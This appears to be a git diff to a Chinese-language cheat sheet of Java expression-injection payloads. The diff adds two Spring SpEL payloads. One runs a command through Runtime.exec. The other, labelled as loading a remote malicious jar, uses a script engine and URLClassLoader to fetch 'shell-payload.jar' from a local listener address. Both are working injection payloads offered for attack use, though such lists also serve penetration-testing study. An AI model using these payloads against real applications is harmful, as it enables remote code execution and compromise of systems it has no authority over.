@@ -22,9 +22,17 @@ AC.getValueStack().findValue(expression));
 
 ## Spring SPEL
 
+执行命令
+
 ```java
 String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";
 String result = parser.parseExpression(expression).getValue().toString();
+```
+
+加载远程恶意Jar
+
+```java
+''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName("JavaScript").eval("var url=Java.type('java.net.URL[]');urls=new url(1);urls[0]=new java.net.URL('http://127.0.0.1:2333/shell-payload.jar');new javax.script.ScriptEngineManager(new java.net.URLClassLoader(urls))")
 ```
 
 ## JSP JSTL_EL
